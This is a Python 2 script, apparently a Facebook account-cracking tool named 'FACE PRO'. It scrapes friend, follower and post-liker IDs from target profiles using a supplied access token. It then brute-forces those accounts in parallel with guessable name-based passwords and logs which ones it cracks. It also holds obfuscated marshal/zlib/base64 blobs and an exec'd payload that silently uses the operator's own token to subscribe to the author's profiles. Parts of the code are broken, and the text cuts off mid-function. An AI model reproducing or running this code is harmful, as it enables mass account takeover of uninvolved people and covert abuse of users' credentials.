#!/usr/bin/python2
# coding=utf-8
# open source code program

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
[ Ingpormasih Script ]

[•] Author      : SH4NI X M3NT4
[•] Facebook    : Https://www.facebook.com/Aang.XD404
[•] WhatsApp   : 0335******
[•] Github      : Github.com/SH4NI
[•] Script name : FACE PRO
[•] Version     : 2.0.4
 
%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\r%s[SH4NI-OK]\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[0;32m' # HIJAU
K = '\x1b[0;33m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Aang Ardiansyah-XD. #
#----------------------------------------------->
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
sys.stdout.write('\x1b[1;35m\x1b]2;@SH4NI\x07')
sys.stdout.write('\x1b[1;37mSH4NI - Already up to date.\n');jeda(2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s[%s] Login with token %s'%(P,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print("""\x1b[0;91m╔═══╗╔═══╗╔═╗╔═╗╔═══╗╔═══╗╔╗───╔═══╗
\x1b[0;91m║╔═╗║║╔═╗║╚╗╚╝╔╝║╔══╝║╔══╝║║───║╔═╗║
\x1b[0;91m║╚═╝║║║─║║─╚╗╔╝─║╚══╗║╚══╗║║───║║─║║
\x1b[0;97m║╔╗╔╝║╚═╝║─╔╝╚╗─║╔══╝║╔══╝║║─╔╗║║─║║
\x1b[0;97m║║║╚╗║╔═╗║╔╝╔╗╚╗║╚══╗║╚══╗║╚═╝║║╚═╝║
\x1b[0;97m╚╝╚═╝╚╝─╚╝╚═╝╚═╝╚═══╝╚═══╝╚═══╝╚═══╝
\x1b[0;93m[\x1b[0;92m#\x1b[0;93m]\x1b[0;95m--------------------------------------------------\x1b[0;93m>
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mCode by   : \x1b[0;97mSH4NI \x1b[0;92m& \x1b[0;97mSH4NI
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mGithub    : Github.com/SH4NI
\x1b[0;93m[\x1b[0;97m+\x1b[0;93m] \x1b[0;97mFacebook  : Facebook.com/SH4NI
\x1b[0;93m[\x1b[0;92m#\x1b[0;93m]\x1b[0;95m--------------------------------------------------\x1b[0;93m>""")
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    jalan('\n%s[1] Login with token \n[2] How to get facebook tokens \n[3] Author info & those who want to donate \n[%s0%s] Go Out (%slogout from script%s)'%(P,M,P,H,P))
    __Kontol__Jimin__Buriq__ = raw_input('\n%s[%s?%s] Choose : %s'%(P,K,P,H))
    if __Kontol__Jimin__Buriq__ in(""):
    	print("%s[•] Correct Content kentod"%(M));exit()
    elif __Kontol__Jimin__Buriq__ in ('1','01'):
        jalan("\n%s[%s!%s] Remember, Must Use a Sacrifice Account !!"%(P,K,P))
    	__Aang__Sayang__Laura__ = raw_input('%s[%s?%s] Malak Token :  %s'%(P,K,P,H))
        if __Aang__Sayang__Laura__ in(""):
        	print("%s[•] Correct content kentod"%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(__Aang__Sayang__Laura__)).json()['name']
            print ('\n%s[%s✓%s] Login Successful, Please Wait...'%(P,H,P));jeda(1)
            open('token.txt', 'w').write(__Aang__Sayang__Laura__);login_xx()
            bot()
            os.system('xdg-open https://www.facebook.com/ツ ¬ P s ɣ c ħ ө ¬)
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s[%s!%s] Token invalid tod !"%(P,M,P));masuk()
    elif __Kontol__Jimin__Buriq__ in ('2', '02'):
    	os.system('xdg-open https://www.facebook.com/ツ ¬ P s ɣ c ħ ө ¬)
    elif __Kontol__Jimin__Buriq__ in ('3', '03'):
    	jalan("\n%s %s Author & Team project %sXNXCODE :\n"%(P,til,O));jeda(1)
        print(" \x1b[1;97m---> \x1b[1;96mAuthor :");jeda(1)
        jalan("%s • SH4NI"%(H))
        jalan("%s • ツ ¬ P s ɣ c ħ ө ¬\n"%(H))
        print("%s ---> Team project %sXNXCODE :"%(P,O));jeda(1)
        jalan("%s • ツ ¬ P s ɣ c ħ ө ¬"%(H))
        jalan("%s • RAXEELO"%(H))
        jalan("%s • ツ ¬ P s ɣ c ħ ө ¬\n"%(H))
        print("%s ---> For Those Who Want To Donate :"%(P));jeda(1)
        jalan("%s • Fund  : %s033*****"%(H,O))
        jalan("%s • Pulse : %s033*****\n"%(H,O))
        jalan("%s • Thank you for your support : %sツ ¬ P s ɣ c ħ ө ¬"%(H,K))
        raw_input('%s[%s!%s] Press enter '%(P,H,P));menu()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVVtPE0EUPtvSFlBRwBuJD4OJpr7Qdi/t1ggo4oNBILESjcaY6c7QLnt1Z1ZtYp/wR/jmX/QneGYBKZsWJexkJjPnu8yZ3dkZB44fDetTrGIOGwbwA+A9djTozFQLGHIUaRprGetzRdzD8GAJZMZiBTgswIEGhwBDgLfhA5iSBZBF2C+ANwvJU9A0TU4BK4Iswe1DDbRQg3dsCoaoLsGwAKwMwyKwCgyRNg3DErAZGJaBzcKwArIMBxVgV+A7wB0lPw5czQeu5QNz+cD1fOBGPjCfBdgC3MkBi5MAVGiTFOOBm/lJb43JojDJszgpi6lJivEAKkqTFOMBVJQnKcYDqKhMUuQA3Hmd6m3cXjtiBlsZeTxckd+kVPszEUvYkgfiw/JHkkHEo4z66VeaCLos7iK6QcMe6aWU7NNQED8lodsnj7+si0cIdngQ9SjxkdPjyBtQ0lX8Z6oRNKCkQ4XnDqi4p6xcEbi+T/sKijmJuU8DN6Qh+on7SNhjtK/gbUyBbLq+S6UbogX67CZoiTTls+NKNyZvsnw3kUMF2TiZNVvR8aTEoaF0PRKnIQ4y9LpKY8CJ4JwMovT3r58/xSbG+lLG4nGt1kto3F/Zpw7vRpG34kRBrVHHp9HUG5Zt1u1GTaRd4SRulydinToOF+JT9upW/8dIb7XaTcvU2w37kkZGo23VzbpltC9n1MR1tSy7Yer65Ywsw2zW66ZtGJd8R3VDt3Rcl25Y5xitnW9k6brebLRMwzSbdls3axgMeChFbT1AF9rjq9nJ/PCs6+r5rm271bT1etO2DQu/wTjTVxfMy3c9LtZFGgQ0GazKJOW5lLYultK//KrqzsF7AyCKMXXVSThlUoW3+OBFkkSJrODg5e5RXzH4N/foxNjOeAn/nHIhRYbFkZBHpqWTAyYjeRG+mk9eOjIIUjl7iriSjmB+Kmf+DvB/HRkx/MdPdeocqqrLM2uyj1gTzKEJq3UjuRIP8I4EwK7KV2xkd3FRW9IWtQWtfKbMj5Sl4zLaPy07VWX2ev5k1vPnV4t6EkQs9fma0klF/AMUwvQ8', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s+%s] Type %sme%s to dump friend id !"%(P,K,P,H,P))
        idt = raw_input('[?] Target id   : %s'%(H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Process dump :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n \n%s[%s✓%s] Success dump id from %s%s'%(P,H,P,H,nm['name']))
        print ('%s[%s•%s] Copy the dump file :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %Press enter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Retype python2 face.py'%(P,K,P))
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s+%s] Type %sme%s if you want to dump your own followers "%(P,K,P,H,P))
        idt = raw_input('[?] Target id   : %s'%(K))
        batas = raw_input('%s[?] Limit id    : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Process dump :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n\n%s[%s✓%s] Success dump id from %s%s'%(P,H,P,H,nm['name']))
        print ('%s[%s+%s] Copy the dump file :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %sPress enter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Retype : python2 face.py'%(P,K,P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s[%s!%s] Keep in mind, posts must be public ! "%(P,M,P))
        idt = raw_input('[?] Post ID   : %s'%(K))
        simpan = raw_input('%s[?] file Name : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[•] Currently dumping id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0040)
        bff.close()
        print ('\n\n%s[%s✓%s] Success dump id posting '%(P,H,P))
        print ('%s[%s+%s]Copy the dump file :%s %s '%(P,H,P,H,file))
        raw_input('\n%s[+] %sEnter %s '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n%s[%s!%s] Retype : python2 face.py'%(P,K,P))
   
# START CRACK
class ngentod:
	
    def __init__(self):
        self.id = []
    def mantan(self):
        try:
            self.apk = raw_input('\n%s[?] Dump File :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s[%s+%s] Total id  : %s%s' %(P,K,P,H,len(self.id))
        except:
            print '\n%s[%s!%s] The dump file dosenot exist, first dump id is kentod'%(P,M,P)
            raw_input('\n%s[•] %sEnter %s '%(P,K,P));menu()
        aangxd = raw_input('%s[?] Want to use manual password? (d/m):%s '%(P,K))
        if aangxd in ('01','1','M', 'm'):
            print '%s[%s!%s] Use (comma) for password separator'%(P,M,P,H,P)
            while True:
                pwx = raw_input('%s[?] Password :%s '%(P,K))
                if pwx == '':
                    print '\n%s[!] Dont be empty kentod'%(M)
                elif len(pwx)<=5:
                    print '\n%s[!] Password minimum 6 characters'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n%s[?] Method : %s'%(P,K))
                        if ind == '':
                            print("%s[•] Correct content kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Account %sCP %ssaved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Account %sCP %ssaved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
                            print '%s[%s•%s] Account %sCP %ssaved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
                            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
                            with ThreadPoolExecutor(max_workers=20) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobile, user, zona)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[•] correct content kentod'%(M));zona()
                    print '\n%s[ \x1b[0;33mPlease select a method to login \x1b[0;97m]\n'%(P)
                    print '\x1b[0;97m[%s1%s] Metode B-Api \x1b[0;35m---> \x1b[0;32mCrack fast & prone to spam'%(K,P);jeda(0.3)
                    print '\x1b[0;97m[%s2%s] Metode Basic \x1b[0;35m---> \x1b[0;32mSlow crack mode'%(K,P);jeda(0.3)
                    print '\x1b[0;97m[%s3%s] Metode Mobile \x1b[0;35m--->\x1b[0;32mCrack is very slow'%(K,P);jeda(0.3)
                    zona(pwx.split(','))
                    break
        elif aangxd in ('02','2','D', 'd'):
            print '\n%s[ \x1b[0;33mPlease select a method to login\x1b[0;97m]\n'%(P)
            print '\x1b[0;97m[%s1%s] Metode B-Api \x1b[0;35m---> \x1b[0;32mCrack fast & prone to spam'%(K,P);jeda(0.1)
            print '\x1b[0;97m[%s2%s] Metode Basic \x1b[0;35m---> \x1b[0;32mSlow crack mode'%(K,P);jeda(0.1)
            print '\x1b[0;97m[%s3%s] Metode Mobile \x1b[0;35m--> \x1b[0;32mCrack is very slow '%(K,P);jeda(0.1)
            self.langsung()
        else:
            print("%s[•] Isi yang benar kentod"%(M));jeda(2);menu()
    def langsung(self):
        __Aang__Sayang__Laura__ = raw_input('\n%s[%s?%s] Method :%s '%(P,K,P,H))
        if __Aang__Sayang__Laura__ == '':
            print("%s[•] Isi yang benar kentod"%(M));self.langsung()
        elif __Aang__Sayang__Laura__ in ('1', '01'):
            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Account %sCP %saved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif __Aang__Sayang__Laura__ in ('2', '02'):
            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Account %sCP %ssaved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif __Aang__Sayang__Laura__ in ('3', '03'):
            print '\n%s[%s•%s] Account %sOK%s saved >%s results/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta)
            print '%s[%s•%s] Account %sCP %ssaved > %sresults/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta)
            print '%s[%s!%s] Airplane mode (3 seconds) every 3 minutes !!\n'%(P,H,P)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobile, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s[•] correct content kentod"%(M));self.langsung()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {
            "user-agent": ua,
